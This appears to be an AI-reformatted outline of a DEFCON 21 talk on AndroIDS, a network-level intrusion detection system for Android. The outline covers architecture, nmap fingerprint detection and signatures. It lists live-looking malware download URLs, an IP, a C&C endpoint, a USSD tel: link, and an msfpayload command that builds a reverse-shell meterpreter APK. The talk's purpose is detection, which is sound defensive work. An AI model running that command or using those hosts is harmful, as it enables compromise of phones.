# Building an Android IDS on Network Level

## Overview
- **Capabilities**: The system allows for comprehensive packet manipulation, including analysis, processing, and modification, all in real-time.
- **Presentation**: DEFCON 21, "How I Met Your Packet"

## Project Summary: AndroIDS
- **Objective**: Develop an open-source, network-based Intrusion Detection System (IDS) and Intrusion Prevention System (IPS) with the following features:
  - Real-time traffic analysis and packet logging for IP networks.
  - Protocol analysis, content searching, and content matching.

## IDS Architecture: Sensor
- **Functionality**:
  - Continuous operation without human supervision.
  - Traffic analysis.
  - Push alerts to the Android device to warn users of threats.
  - Reporting to a Logging Server.
  - Custom reactive actions such as dropping specific packets, adding new rules to iptables, launching scripts/modules, and syncing attack signatures to keep them updated.
  - Minimal overhead.

## IDS Architecture: Server
- **Configuration**:
  - Runs on a Linux box.
  - Receives messages from the Android sensor.
- **Responsibilities**:
  - Send signatures to remote devices.
  - Store events in a database.
  - Detect statistical anomalies and perform real-time analysis.

### Network Diagram
```
Android Device
  |
  v
Internet
  |
  v
Firewall
  |
  v
IDS Server & Database
  |
  v
Web Interface
```

## Protocol Analysis
- **Example**: Packets with FIN, SYN, PUSH, and URG flags active.
  - Report to the Central Logger and drop the packet.

## Remote OS Fingerprinting
- **Detection and Prevention**:
  - Identify and drop packets sent from well-known scanning tools like nmap.
  - nmap OS fingerprinting sends up to 16 TCP, UDP, and ICMP probes to known open and closed ports of the target machine.

### Probes
- Sequence Generation (SEQ, OPS, WIN, T1)
- ICMP Echo (IE)
- TCP Explicit Congestion Notification (ECN)
- TCP T2-T7
- UDP

## Pattern Matching
- **Signature Format**:
  - Custom-built signatures for detecting probes or attacks designed for mobile devices.
  - Conversion of Snort-like rules to a user-friendly format.

## USSD Exploit
- **Description**:
  - USSD codes are used to perform actions on phones, primarily by network operators for services like call-forwarding, balance inquiries, and multiple SIM functions.
  - Example HTML code to execute an action: `<a href="tel:*#06#">Click here to call</a>`
  - Example exploit: `hxxp://adobeﬂashplayer-­‐up.ru/?a=RANDOM_CHARACTERS – 93.170.107.184`

## Web Signatures
- **Malware Examples**:
  - ANDR.TROJAN.SMSSEND
    - Downloaded from: 
      - `hxxp://adobeﬂashplayer-­‐up.ru/?a=RANDOM_CHARACTERS – 93.170.107.184`
      - `hxxp://googleplaynew.ru/?a=RANDOM_CHARACTERS – 93.170.107.184`
      - `hxxp://browsernew-­‐update.ru/?a=RANDOM_CHARACTERS – 93.170.107.184`
    - Connects to C&C: `gaga01.net/rq.php`
    - Search pattern: `rq.php`
  - METERPRETER
    - Features command history, tab completion, channels, and more.
    - Example usage:
      ```sh
      $ msfpayload android/meterpreter/reverse_tcp LHOST=192.168.0.20 R > meter.apk
      $ file meter.apk
      meter.apk: Zip archive data, at least v2.0 to extract
      ```

## Conclusion
- **Thank You!**
- **Contact Information**:
  - Jaime Sánchez
  - @segofensiva
  - Email: [Your Email Address]

---

This optimized version aims to provide a clear, professional, and structured presentation of the information.